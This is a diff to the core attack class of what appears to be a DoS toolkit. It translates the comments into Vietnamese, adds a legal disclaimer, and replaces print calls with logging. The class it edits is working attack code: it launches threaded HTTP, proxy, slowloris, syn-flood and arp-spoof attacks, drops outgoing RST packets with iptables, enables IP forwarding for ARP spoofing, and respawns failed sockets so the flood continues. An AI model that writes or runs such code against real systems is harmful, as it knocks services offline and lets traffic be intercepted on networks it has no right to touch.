@@ -1,7 +1,12 @@
-"""This module provides a class to instantiate DoS attacks."""
+"""Module cung cấp lớp AttackMethod để thực hiện các cuộc tấn công DoS.
+
+Lưu ý: Việc tấn công DoS có thể vi phạm pháp luật và chính sách sử dụng của các dịch vụ mạng.
+Chỉ sử dụng cho mục đích nghiên cứu và kiểm thử trong môi trường kiểm soát.
+"""
 
 from __future__ import annotations
 
+import logging
 import os
 import socket
 import sys
@@ -15,9 +20,16 @@ from humanfriendly import Spinner, format_timespan
 from tools.addons.ip_tools import get_host_ip, get_target_address
 from tools.addons.sockets import create_socket, create_socket_proxy
 
+# Cấu hình logging (có thể cấu hình thêm file handler nếu cần)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    datefmt="%H:%M:%S",
+)
+
 
 class AttackMethod:
-    """Control the attack's inner operations."""
+    """Lớp quản lý các thao tác nội bộ của cuộc tấn công DoS."""
 
     def __init__(
         self,
@@ -27,32 +39,29 @@ class AttackMethod:
         target: str,
         sleep_time: int = 15,
     ):
-        """Initialize the attack object.
+        """
+        Khởi tạo đối tượng tấn công.
 
         Args:
-            - method_name - The name of the DoS method used to attack
-            - duration - The duration of the attack, in seconds
-            - threads - The number of threads that will attack the target
-            - target - The target's URL
-            - sleep_time - The sleeping time of the sockets (Slowloris only)
+            method_name: Tên phương thức tấn công (ví dụ: "http", "syn-flood", "slowloris", ...)
+            duration: Thời gian tấn công (giây)
+            threads: Số lượng thread tấn công
+            target: URL hoặc IP của mục tiêu
+            sleep_time: Thời gian chờ giữa các lần gọi (dành riêng cho Slowloris)
         """
         self.method_name = method_name
         self.duration = duration
         self.threads_count = threads
         self.target = target
         self.sleep_time = sleep_time
-        self.threads: List[Thread]
-        self.threads = []
+        self.threads: List[Thread] = []
         self.is_running = False
 
     def get_method_by_name(self) -> None:
-        """Get the flood function based on the attack method.
+        """
+        Xác định hàm flood tương ứng dựa trên tên phương thức tấn công.
 
-        Args:
-            None
-
-        Returns:
-            None
+        Cài đặt các cấu hình bổ sung (ví dụ cấu hình iptables đối với syn-flood hay bật ip_forward với arp-spoof).
         """
         if self.method_name in ["http", "http-proxy", "slowloris", "slowloris-proxy"]:
             self.layer_number = 7
@@ -65,19 +74,28 @@ class AttackMethod:
             if self.method_name == "arp-spoof":
                 os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
             self.layer_number = 2
+        else:
+            logging.error("Phương thức tấn công không được hỗ trợ: %s", self.method_name)
+            sys.exit(1)
+
         directory = f"tools.L{self.layer_number}.{self.method_name}"
-        module = __import__(directory, fromlist=["object"])
-        self.method = getattr(module, "flood")
+        try:
+            module = __import__(directory, fromlist=["object"])
+            self.method = getattr(module, "flood")
+            logging.info("Đã load thành công module %s", directory)
+        except (ImportError, AttributeError) as e:
+            logging.error("Không load được module %s: %s", directory, e)
+            sys.exit(1)
 
     def __enter__(self) -> AttackMethod:
-        """Set flood function and target attributes."""
+        """Thiết lập hàm flood và cập nhật target nếu cần."""
         self.get_method_by_name()
         if self.layer_number != 2:
             self.target = get_target_address(self.target)
         return self
 
     def __exit__(self, exc_type, exc_value, traceback) -> None:
-        """Restore system's default variables."""
+        """Khôi phục cấu hình hệ thống sau khi tấn công kết thúc."""
         if self.method_name == "syn-flood":
             os.system(
                 f"sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -s {get_host_ip()} -j DROP"
@@ -86,46 +104,58 @@ class AttackMethod:
             os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
 
     def __run_timer(self) -> None:
-        """Verify the execution time every second."""
-        __stop_time = time() + self.duration
-        while time() < __stop_time:
+        """Đếm thời gian tấn công và tắt flag is_running khi hết thời gian."""
+        stop_time = time() + self.duration
+        while time() < stop_time:
             sleep(1)
         self.is_running = False
 
     def __slow_flood(
         self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
     ) -> None:
-        """Run slowloris and slowloris-proxy attack methods."""
+        """
+        Xử lý riêng cho các phương thức slowloris (có hoặc không dùng proxy).
+
+        Nếu gặp lỗi kết nối, thread sẽ được tạo mới để đảm bảo tấn công liên tục.
+        """
         if "proxy" in self.method_name:
             try:
                 self.method(args[0], args[1])
             except (ConnectionResetError, BrokenPipeError):
-                self.thread = Thread(
-                    target=self.__run_flood, args=create_socket_proxy(self.target)
-                )
-                self.thread.start()
+                logging.warning("Lỗi kết nối, tạo lại socket proxy.")
+                new_args = create_socket_proxy(self.target)
+                Thread(target=self.__run_flood, args=new_args).start()
         else:
             try:
                 self.method(args[0])
             except (ConnectionResetError, BrokenPipeError):
-                self.thread = Thread(
-                    target=self.__run_flood, args=(create_socket(self.target),)
-                )
-                self.thread.start()
+                logging.warning("Lỗi kết nối, tạo lại socket.")
+                new_socket = create_socket(self.target)
+                Thread(target=self.__run_flood, args=(new_socket,)).start()
         sleep(self.sleep_time)
 
     def __run_flood(
         self, *args: Union[socket.socket, Tuple[socket.socket, Dict[str, str]]]
     ) -> None:
-        """Start the flooder."""
+        """
+        Thực thi hàm flood liên tục cho đến khi flag is_running tắt.
+
+        Gọi riêng __slow_flood nếu đang dùng phương thức slowloris.
+        """
         while self.is_running:
             if "slowloris" in self.method_name:
                 self.__slow_flood(*args)
             else:
-                self.method(self.target)
+                try:
+                    self.method(self.target)
+                except Exception as e:
+                    logging.error("Lỗi trong quá trình flood: %s", e)
 
     def __slow_threads(self) -> Iterator[Thread]:
-        """Initialize the threads for slowloris and slowloris-proxy attacks."""
+        """
+        Tạo các thread cho phương thức slowloris (có hoặc không dùng proxy)
+        với giao diện Spinner hiển thị tiến trình tạo socket.
+        """
         with Spinner(
             label=f"{F.YELLOW}Creating {self.threads_count} Socket(s)...{F.RESET}",
             total=100,
@@ -142,18 +172,22 @@ class AttackMethod:
                 spinner.step(100 / self.threads_count * (index + 1))
 
     def __start_threads(self) -> None:
-        """Start the threads."""
+        """
+        Khởi chạy các thread đã khởi tạo và hiển thị giao diện Spinner.
+        """
         with Spinner(
             label=f"{F.YELLOW}Starting {self.threads_count} Thread(s){F.RESET}",
             total=100,
         ) as spinner:
             for index, thread in enumerate(self.threads):
-                self.thread = thread
-                self.thread.start()
+                thread.start()
                 spinner.step(100 / len(self.threads) * (index + 1))
 
     def __run_threads(self) -> None:
-        """Initialize the threads and start them."""
+        """
+        Khởi tạo và chạy các thread tấn công.
+        Sau đó, khởi động timer và chờ cho đến khi tất cả thread hoàn thành.
+        """
         if "slowloris" in self.method_name:
             self.threads = list(self.__slow_threads())
         else:
@@ -163,32 +197,32 @@ class AttackMethod:
 
         self.__start_threads()
 
-        # Timer starts counting after all threads were started.
+        # Khởi động timer để dừng tấn công sau thời gian quy định
         Thread(target=self.__run_timer).start()
 
-        # Close all threads after the attack is completed.
+        # Chờ cho đến khi tất cả thread kết thúc
         for thread in self.threads:
             thread.join()
 
-        print(f"{F.MAGENTA}\n\n[!] {F.BLUE}Attack Completed!\n\n{F.RESET}")
+        logging.info("Attack Completed!")
 
     def start(self) -> None:
-        """Start the DoS attack itself."""
-        duration = format_timespan(self.duration)
-
-        print(
-            f"{F.MAGENTA}\n[!] {F.BLUE}Attacking {F.MAGENTA}{self.target} {F.BLUE}"
-            f"using {F.MAGENTA}{self.method_name.upper()}{F.BLUE} method {F.MAGENTA}\n\n"
-            f"[!] {F.BLUE}The attack will stop after {F.MAGENTA}{duration}{F.BLUE}\n{F.RESET}"
+        """
+        Khởi động cuộc tấn công DoS.
+        
+        Hiển thị thông tin chi tiết về mục tiêu, phương thức và thời gian tấn công.
+        """
+        duration_str = format_timespan(self.duration)
+        logging.info(
+            "[!] Attacking %s using %s method. The attack will stop after %s.",
+            self.target,
+            self.method_name.upper(),
+            duration_str,
         )
         if "slowloris" in self.method_name:
-            print(
-                f"{F.MAGENTA}[!] {F.BLUE}Sockets that eventually went down are automatically recreated!\n\n{F.RESET}"
-            )
+            logging.info("Sockets gặp lỗi sẽ được tự động tạo lại.")
         elif self.method_name == "http-proxy":
-            print(
-                f"{F.MAGENTA}[!] {F.BLUE}Proxies that don't return 200 status are automatically replaced!\n\n{F.RESET}"
-            )
+            logging.info("Proxies không trả về status 200 sẽ được tự động thay thế.")
 
         self.is_running = True
 
@@ -196,13 +230,9 @@ class AttackMethod:
             self.__run_threads()
         except KeyboardInterrupt:
             self.is_running = False
-            print(
-                f"{F.RED}\n\n[!] {F.MAGENTA}Ctrl+C detected. Stopping Attack...{F.RESET}"
-            )
-
+            logging.warning("Ctrl+C detected. Stopping Attack...")
             for thread in self.threads:
                 if thread.is_alive():
                     thread.join()
-
-            print(f"{F.MAGENTA}\n[!] {F.BLUE}Attack Interrupted!\n\n{F.RESET}")
+            logging.info("Attack Interrupted!")
             sys.exit(1)
